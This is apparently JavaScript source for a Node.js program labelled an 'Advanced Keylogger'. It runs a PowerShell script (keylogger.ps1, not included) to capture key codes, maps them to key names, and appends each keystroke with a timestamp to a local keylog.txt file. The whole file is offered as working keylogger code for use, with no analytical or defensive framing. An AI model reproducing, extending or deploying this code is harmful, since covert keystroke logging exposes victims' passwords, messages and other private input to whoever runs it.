const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const logFile = path.join(__dirname, 'keylog.txt');
const writeStream = fs.createWriteStream(logFile, { flags: 'a' });

console.log('Advanced Keylogger is running...');

const powershellScriptPath = path.join(__dirname, 'keylogger.ps1');
const command = `powershell.exe -File "${powershellScriptPath}"`;

const child = exec(command);

const keyMap = {
    8: 'Backspace',
    9: 'Tab',
    13: 'Enter',
    16: 'Shift',
    17: 'Ctrl',
    18: 'Alt',
    20: 'CapsLock',
    27: 'Esc',
    32: 'Space',
    37: 'Left',
    38: 'Up',
    39: 'Right',
    40: 'Down',
    46: 'Delete'
};

for (let i = 65; i <= 90; i++) {
    keyMap[i] = String.fromCharCode(i);
}

child.stdout.on('data', (data) => {
    const keys = data.trim().split('\n');
    keys.forEach(key => {
        const keyCode = parseInt(key.trim());
        const keyName = keyMap[keyCode] || `Key${keyCode}`;
        const logEntry = `${new Date().toISOString()} - Key: ${keyName}\n`;
        writeStream.write(logEntry);
        console.log(logEntry);
    });
});

process.on('SIGINT', () => {
    child.kill();
    writeStream.end();
    console.log('Keylogger stopped.');
    process.exit();
});

